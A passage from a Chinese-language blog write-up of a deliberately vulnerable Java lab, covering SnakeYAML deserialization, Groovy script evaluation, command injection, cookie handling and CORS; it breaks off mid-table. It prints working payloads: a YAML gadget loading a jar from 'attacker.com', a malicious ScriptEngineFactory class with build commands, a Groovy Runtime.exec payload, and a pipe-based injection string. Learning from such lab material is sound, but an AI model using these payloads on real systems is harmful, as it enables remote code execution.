<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 显式标签</span><br><span class="line">value: !&lt;tag&gt; content</span><br><span class="line"></span><br><span class="line"># 隐式标签（通常由处理器自动推断）</span><br><span class="line">key: !!str <span class="number">123</span>  # 强制将数字 <span class="number">123</span> 转为字符串</span><br></pre></td></tr></table></figure>

<p>不同编程语言的 YAML 解析器可能扩展额外标签，例如：</p>
<ul>
<li><strong>Java（SnakeYAML）</strong>：<br>  <code>!!java/lang/String</code>、<code>!!java/util/ArrayList</code>，甚至支持反序列化任意类（如 <code>!!javax.script.ScriptEngineManager</code>）。</li>
<li><strong>Python（PyYAML）</strong>：<br>  <code>!!python/object</code>、<code>!!python/tuple</code>，可直接构造 Python 对象。</li>
</ul>
<p>也就是说这个标签分为显示和隐式两种，然后我们可以对数据进行类型转换和对象构造等特殊处理</p>
<p>当标签指向java的一个具体的类的时候就会进行实例化，因此我们可以通过类的实例化像代码一样创建子进程然后进行命令执行</p>
<p><strong>实例</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [       # 表示要实例化一个 ScriptEngineManager 对象</span><br><span class="line">  !!java.net.URLClassLoader [[            # 构造 URLClassLoader 对象作为参数</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://attacker.com/malicious.jar&quot;</span>]  # 构造 URL 对象</span><br><span class="line">  ]]</span><br><span class="line">]</span><br><span class="line"><span class="comment">//这个就是我们上一个路由中使用的引擎接口，然后通过对象的实例化加载其他.jar，文件，至于原理现在还不知道</span></span><br></pre></td></tr></table></figure>

<p>从网上下载下来payload，更改为Windows模式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG] AwesomeScriptEngineFactory loaded!&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们再根据说明书使用命令将其打包为.jar文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>

<p>我们再将payload改为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?content=!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://127.0.0.1:1999/yaml-payload.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>


<p>然后就是一开始不知道是加载文件错误导致，我更换.jar文件后但是靶场加载的文件好像没换，后面看控制台的输出发现了这个问题，所以说当不知道怎么回事的时候重启一下apache或者靶场搞不好就可以了</p>
<h3 id="groovy"><a href="#groovy" class="headerlink" title="&#x2F;groovy"></a>&#x2F;groovy</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;groovy&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">groovyshell</span><span class="params">(String content)</span> &#123;</span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        groovyShell.evaluate(content);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里使用到了一个GroovyShell类</p>
<p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。</p>
<p><strong>GroovyShell</strong></p>
<p><code>GroovyShell</code> 是 <strong>Groovy 语言</strong> 提供的核心类，用于 <strong>动态解析和执行 Groovy 脚本</strong>。它可以像解释器一样直接运行 Groovy 代码，常用于脚本引擎、规则引擎或动态逻辑执行场景。</p>
<p>也就是这个代码通过evaluate()方法可以执行Groovy代码</p>
<p>任何合法的 Java 代码，几乎都可以直接在 Groovy 中运行（反之不成立）。</p>
<p>也就是说我们直接执行java代码就行了</p>
<p>payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=Runtime.getRuntime().exec(<span class="string">&#x27;calc.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>







<h2 id="2-CommandInject"><a href="#2-CommandInject" class="headerlink" title="2.CommandInject"></a>2.CommandInject</h2><p>命令执行结束后还是直接来进行命令注入，我们之前在学php的时候也遇到过命令注入，主要是通过命令分隔符等操作通过拼接执行命令</p>
<p><strong>Windows</strong></p>
<table>
<thead>
<tr>
<th>拼接符</th>
<th>示例</th>
<th>详解</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>a&amp;b</td>
<td>无论a是否正确b都会执行</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>a&amp;&amp;b</td>
<td>当a正确b才会执行</td>
</tr>
<tr>
<td>||</td>
<td>a||b</td>
<td>a执行失败然后才执行b</td>
</tr>
<tr>
<td>|</td>
<td>a|b</td>
<td>表示A命令语句的输出，作为B命令语句的输入执行。当A失败的时候将不会执行</td>
</tr>
</tbody></table>
<p><strong>Linux</strong></p>
<table>
<thead>
<tr>
<th>拼接符</th>
<th>详解</th>
</tr>
</thead>
<tbody><tr>
<td>|</td>
<td>表示A命令语句的输出，作为B命令语句的输入执行。当A失败的时候将不会执行</td>
</tr>
<tr>
<td>%0a</td>
<td>应该是回车键的url编码，不知道为什么也可以用来作为命令分隔符</td>
</tr>
<tr>
<td>&amp;</td>
<td>后台运行</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>当a正确b才会执行</td>
</tr>
<tr>
<td>||</td>
<td>a||b</td>
</tr>
<tr>
<td>（）</td>
<td>如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用 圆括号()把所有命令组合起来,示例如下</td>
</tr>
<tr>
<td>;</td>
<td>将多个命令用;分隔开可以运行多个命令</td>
</tr>
</tbody></table>
<h3 id="codeinject"><a href="#codeinject" class="headerlink" title="&#x2F;codeinject"></a>&#x2F;codeinject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/codeinject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">codeInject</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        String[] cmdList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;dir &quot;</span> + filepath&#125;;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdList);</span><br><span class="line">        builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">        <span class="keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line"><span class="comment">//将命令输出流转换为字符串返回给客户端</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个代码还是卡了我一下的，本来是一个很简单的命令分隔符，但是由于编码方面的问题，不知道是不是Windows的问题，会出现乱码的问题。但是这不是最重要的，就是我们的命令分隔符在url中属于特殊字符必须进行url编码不然就会返回400.</p>
<p>然后就是靶场似乎会把命令执行后的输出直接固定在路由中输出了，重启才能刷新，导致有时候没有成功访问路径但是有回显</p>
<p>paylod很简单，就是使用命令拼接符，但是需要注意不能未经编码就出现斜杠，反斜杠，竖杠等特殊字符，然后就是在访问后url会被解码，需要再次编码。这个也许和WIndows系统的路径分隔符是<code>\</code>有关，会被解析为url的路径符，其他的估计也是有其他作用，也有可能和我使用的服务器是tomcat有关</p>
<p>payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath=D%3A%5Cphpstudy_pro%5CWWW%5Cregu%7Ccalc.exe</span><br></pre></td></tr></table></figure>

<p>我这里故意将地址写错，然后使用竖杠执行后面的命令</p>




<h3 id="codeinject-host"><a href="#codeinject-host" class="headerlink" title="&#x2F;codeinject&#x2F;host"></a>&#x2F;codeinject&#x2F;host</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/codeinject/host&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">codeInjectHost</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="comment">//参数和以前不一样直接获取请求头</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;host&quot;</span>);</span><br><span class="line">        logger.info(host);<span class="comment">// 记录Host头到日志（可能泄露敏感信息）</span></span><br><span class="line">        String[] cmdList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;curl &quot;</span> + host&#125;;<span class="comment">//直接通过host拼接到参数</span></span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdList);</span><br><span class="line">        builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">        <span class="keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个代码本来是可以进行拼接的，但是由于我使用的tomcat版本过高，对host传入的特殊字符<code>&amp;|</code>等命令分隔符存在过滤，url编码也不行，所以说目前我认为不存在命令注入</p>
<h3 id="codeinject-sec"><a href="#codeinject-sec" class="headerlink" title="&#x2F;codeinject&#x2F;sec"></a>&#x2F;codeinject&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/codeinject/sec&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">codeInjectSec</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filterFilePath</span> <span class="operator">=</span> SecurityUtil.cmdFilter(filepath);</span><br><span class="line"><span class="comment">//对我们输入参数进行过滤</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == filterFilePath) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Bad boy. I got u.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmdList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;dir /A &quot;</span> + filterFilePath&#125;;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdList);</span><br><span class="line">        builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">        <span class="keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个代码我们首先需要注意的就是对我们的输入多了一个过滤函数<code>SecurityUtil.cmdFilter</code></p>
<p><strong>SecurityUtil.cmdFilter</strong></p>
<p><code>SecurityUtil.cmdFilter</code> 是一个 <strong>输入过滤方法</strong>，用于拦截用户输入中的危险字符，防止命令注入漏洞。</p>
<p><strong>核心目标</strong>：阻止以下攻击：</p>
<ul>
<li>命令注入（如 <code>&amp;</code>、<code>|</code>、<code>;</code>）。</li>
<li>路径遍历（如 <code>../</code>、<code>..\</code>）。</li>
<li>特殊字符绕过（如反引号 &#96;&#96;&#96;、<code>$()</code>）。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private <span class="type">static</span> final Pattern FILTER_PATTERN = Pattern.compile(<span class="string">&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里使用正则表达式进行匹配，是否只包含字母、数字、下划线、斜杠、点或破折号，如果是，则进行命令拼接运行，否则返回<code>Bad boy. I got u</code></p>
<p>这个由于我是在Windows环境下运行绝对路径对出现引号，而且用的还是反斜杠，导致绝对路径被过滤不能使用，但是这个代码就是文件读取命令，没什么好注入的</p>
<h2 id="3-Cookies"><a href="#3-Cookies" class="headerlink" title="3.Cookies"></a>3.Cookies</h2><p>靶场中这个好像没什么可以操作的地方，代码只是使用各种方式去获取我的Cookie然后进行输出，那也就介绍一下代码中使用到的函数吧</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/cookie&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cookies</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">NICK</span> <span class="operator">=</span> <span class="string">&quot;nick&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/vuln01&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">vuln01</span><span class="params">(HttpServletRequest req)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">nick</span> <span class="operator">=</span> WebUtils.getCookieValueByName(req, NICK); <span class="comment">// key code</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cookie nick: &quot;</span> + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/vuln02&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">vuln02</span><span class="params">(HttpServletRequest req)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">nick</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Cookie[] cookie = req.getCookies();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cookie != <span class="literal">null</span>) &#123;</span><br><span class="line">            nick = getCookie(req, NICK).getValue();  <span class="comment">//这个我没找到这是什么代码，有可能是靶场自己写的一个静态类和方法</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cookie nick: &quot;</span> + nick;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//1和2两个路由都是属于直接获取cookie然后输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/vuln03&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">vuln03</span><span class="params">(HttpServletRequest req)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">nick</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Cookie cookies[] = req.getCookies();</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Cookie cookie : cookies) &#123;</span><br><span class="line"><span class="comment">//这个是java中增强版的for循环，用于遍历cookies数组 其中cookie为临时变量名</span></span><br><span class="line">                <span class="comment">// key code. Equals can also be equalsIgnoreCase.</span></span><br><span class="line">                <span class="keyword">if</span> (NICK.equals(cookie.getName())) &#123;</span><br><span class="line"><span class="comment">//通过equals()方法判断两个字符串是否相等 不忽略大小写</span></span><br><span class="line">                    nick = cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cookie nick: &quot;</span> + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/vuln04&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">vuln04</span><span class="params">(HttpServletRequest req)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">nick</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Cookie cookies[] = req.getCookies();</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Cookie cookie : cookies) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cookie.getName().equalsIgnoreCase(NICK)) &#123;  <span class="comment">//还是比较字符串但是忽略大小写</span></span><br><span class="line">                    nick = cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cookie nick: &quot;</span> + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/vuln05&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">vuln05</span><span class="params">(<span class="meta">@CookieValue(&quot;nick&quot;)</span> String nick)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cookie nick: &quot;</span> + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/vuln06&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">vuln06</span><span class="params">(<span class="meta">@CookieValue(value = &quot;nick&quot;)</span> String nick)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cookie nick: &quot;</span> + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>WebUtils.getCookieValueByName</strong></p>
<p><code>WebUtils.getCookieValueByName</code> 是一个 <strong>从 HTTP 请求中获取指定名称的 Cookie 值</strong> 的实用方法，通常用于 Java Web 开发（如 Spring、Servlet 等框架）。</p>
<p>至于WebUtils就是一个专门用来处理Web请求与相应的类</p>
<ul>
<li><strong>输入</strong>：HTTP 请求对象 + Cookie 名称。</li>
<li><strong>输出</strong>：<ul>
<li>该 Cookie 的值（<code>String</code> 类型）。</li>
<li>如果 Cookie 不存在，返回 <code>null</code> 或默认值（取决于实现）。</li>
</ul>
</li>
<li><strong>典型用途</strong>：<ul>
<li>读取认证 Token（如 <code>JSESSIONID</code>）。</li>
<li>获取用户偏好设置（如语言选择 <code>lang=en</code>）</li>
</ul>
</li>
</ul>
<p><strong>getCookies()</strong></p>
<p>这个就很明显，直接获得当前的cookie，但是这个和getCookieValueByName不同的就是获得的是一个键值对数组</p>
<p><strong>返回值</strong>：</p>
<ul>
<li><code>Cookie[]</code> 数组：包含所有 Cookie 对象的数组。</li>
<li>如果请求中没有 Cookie，返回 <code>null</code>。</li>
</ul>
<h2 id="4-Cors"><a href="#4-Cors" class="headerlink" title="4.Cors"></a>4.Cors</h2><p>跨域请求伪造，由于限制不严导致可以跨域请求敏感信息，一般结合XSS，CSRF等等漏洞进行攻击。</p>
<p>话说为什么之前都没碰到过这个漏洞啊，不好出CTF的题目吗</p>
<p>在了解Cors之前我们需要知道SOP(同源策略)</p>
<p><strong>SOP(同源策略)</strong></p>
<p><strong>SOP（Same-Origin Policy，同源策略）</strong> 是浏览器最核心的安全策略之一，用于限制不同源的文档或脚本之间的交互，防止恶意网站窃取用户数据或发起跨站攻击。</p>
<p>两个URL的 <strong>协议（Protocol）、域名（Host）、端口（Port）</strong> 必须完全一致才属于同源。</p>
<table>
<thead>
<tr>
<th><code>https://example.com/page</code></th>
<th><code>https://example.com/other</code></th>
<th>✅ 同源</th>
<th>协议、域名、端口均相同</th>
</tr>
</thead>
<tbody><tr>
<td><code>http://example.com</code></td>
<td><code>https://example.com</code></td>
<td>❌ 不同源</td>
<td>协议不同（HTTP vs HTTPS）</td>
</tr>
<tr>
<td><code>https://example.com:443</code></td>
<td><code>https://example.com:8080</code></td>
